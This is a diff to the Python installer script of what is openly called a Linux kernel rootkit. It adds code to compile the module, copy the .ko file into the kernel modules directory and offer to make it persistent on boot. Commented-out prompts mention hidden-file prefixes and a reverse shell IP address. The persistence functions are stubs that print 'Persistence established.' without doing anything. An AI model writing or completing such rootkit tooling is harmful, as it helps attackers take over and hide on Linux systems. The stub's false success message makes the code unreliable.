@@ -3,6 +3,8 @@
 
 import os
 import sys
+import subprocess as sp
+from shutil import move
 # import argparse
 
 #######
@@ -62,6 +64,25 @@ def prompt(text, default=""):
 		return response
 
 
+####
+# Build Process Helpers
+####
+
+def run_cmd(command):
+	"""
+	Wrapper on subprocess.run to handle shell commands as either a list of args
+	or a single string.
+	:return: True if process exits successfully and False otherwise
+	"""
+	# TODO: Pipe all output to sp.DEVNULL when done fine-tuning build script.
+	if not isinstance(command, list):
+		process = sp.run(command.split(), stdout=sp.PIPE, stderr=sp.PIPE)
+		return process.returncode == 0
+	else:
+		process = sp.run(command, stdout=sp.PIPE, stderr=sp.PIPE)
+		return process.returncode == 0
+
+
 def create_config_header_file(user_defines: dict):
 	"""
 	Creates config.h file and populates it with user defined constants.
@@ -75,6 +96,28 @@ def create_config_header_file(user_defines: dict):
 	with open("config.h", "w") as f:
 		f.write(contents)
 
+####
+# Persistence Helpers
+####
+
+
+def enable_persistence(module_name):
+	print_status("Making rootkit persistent...")
+	# TODO: This
+	print_success("Persistence established.")
+	pass
+
+
+def remove_persistence(module_name):
+	# TODO: This
+	pass
+
+
+####
+# Main Setup Methods
+# 	- Install
+# 	- Uninstall
+####
 
 def validate_os_and_kernel():
 	"""
@@ -105,28 +148,40 @@ def install(kernel_version):
 	# config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "Garden")
 	# config["REVERSE_SHELL_IP_ADDR"] = prompt("Enter IP address for reverse shell.")
 
-	module_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
-	if not os.path.exists(module_dir):
-		os.mkdir(module_dir)
-
 	print_status("Creating config.h file...")
 	create_config_header_file(config)
 	print_success("config.h created.")
 
 	# TODO: Compile rootkit
 	print_status("Compiling rootkit...")
-	print_success("Successful compilation.")
+	if not run_cmd("make all"):
+		print_error("Compiling failed.")
+		sys.exit(1)
+	else:
+		print_success("Successful compilation.")
 
 	# TODO: Move compiled components to the right place.
 	print_status("Installing rootkit...")
-	print_success("Successful installation.")
+	module_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
+	if not os.path.exists(module_dir):
+		os.mkdir(module_dir)
 
-	# TODO: Make them load on boot.
-	print_status("Making rootkit persistent...")
-	print_success("Persistence established.")
+	try:
+		# TODO: Decide if moving the .ko file to the module_dir is necessary
+		# TODO: Actually load the kernel module
+		move("{}.ko".format(config["MODULE_NAME"]), module_dir)
+		# depmod && insmod /$MODULE/$MODULE.ko
+		print_success("Successful installation.")
+	except IOError as e:
+		print_error("Unable to copy file. {}".format(e))
+		sys.exit()
+
+	# Option to enable persistence by making the module load on boot.
+	if prompt_yes_no("Enable persistence?"):
+		enable_persistence(config["MODULE_NAME"])
 
 
-def remove():
+def uninstall():
     pass
 
 
